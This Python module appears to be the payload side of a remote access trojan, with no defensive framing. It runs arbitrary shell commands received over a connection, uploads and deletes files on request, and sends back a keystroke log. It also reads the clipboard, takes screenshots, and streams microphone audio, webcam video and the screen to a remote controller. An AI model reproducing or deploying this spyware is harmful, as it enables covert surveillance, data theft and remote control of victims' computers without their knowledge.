import os
import struct
import pickle
import wave
import pyperclip
import pyautogui
import pyaudio
import cv2
import subprocess
import numpy as np
import mss
from .connection_module import (send_file, read_string_from_connection, 
                               send_string_into_connection, send_image)


def gather_system_info(connection, operation_system):
    try:
        cmd = "systeminfo" if operation_system == "Windows" else "lscpu"
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()
        send_string_into_connection(connection, stdout + stderr)
    except Exception as e:
        print(f"Error gathering system info: {e}")

def command_line_interface(connection):
    cmd = read_string_from_connection(connection)
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = process.communicate()
    send_string_into_connection(connection, stdout + stderr)

def file_directory_discovery(connection, operation_system):
    cmd = "dir" if operation_system == "Windows" else "ls -l"
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = process.communicate()
    send_string_into_connection(connection, stdout + stderr)

def remote_file_copy(connection):  
    filename = read_string_from_connection(connection)
    send_file(connection, filename)

def file_deletion(connection):
    filename = read_string_from_connection(connection)
    os.remove(filename)

def process_discovery(connection, operation_system):
    cmd = "tasklist" if operation_system == "Windows" else "ps aux"
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = process.communicate()
    send_string_into_connection(connection, stdout + stderr)

def input_capture(connection):
    send_file(connection, "keys.txt")

def clipboard_data(connection):
    clboard = pyperclip.paste()
    send_string_into_connection(connection, clboard)

def screenshot_capture(connection):
    pyautogui.screenshot("screenshot.png")
    send_file(connection, "screenshot.png")
    os.remove("screenshot.png")

def audio_capture(connection):
    try:
        seconds = read_string_from_connection(connection)
        seconds = int(seconds)
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        RECORD_SECONDS = seconds
        WAVE_OUTPUT_FILENAME = "output.wav"

        with pyaudio.PyAudio() as p:
            stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
            frames = [stream.read(CHUNK) for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS))]
            stream.stop_stream()
            stream.close()

        with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))

        send_file(connection, "output.wav")
    except Exception as e:
        print(f"Error in audio capture: {e}")


def video_capture(connection):
    cap = cv2.VideoCapture(0)
    while True:
        do = connection.recv(10)
        if do == b"continue":
            ret, frame = cap.read()
            data = pickle.dumps(frame)
            message_size = struct.pack("L", len(data))
            connection.sendall(message_size + data)
        elif do == b"stop":
            break
    cap.release()

def screen_capture(connection):
    print("Capturing...")
    capturing = True
    while capturing: 
        screenshot = pyautogui.screenshot()
        screenshot_np = np.array(screenshot)
        screenshot_np = cv2.cvtColor(screenshot_np, cv2.COLOR_RGB2BGR)
        try:
            send_image(connection, screenshot_np)
        except Exception as e:
            print(f"Error sending image {e}")
        print(f"Sent image {screenshot_np}")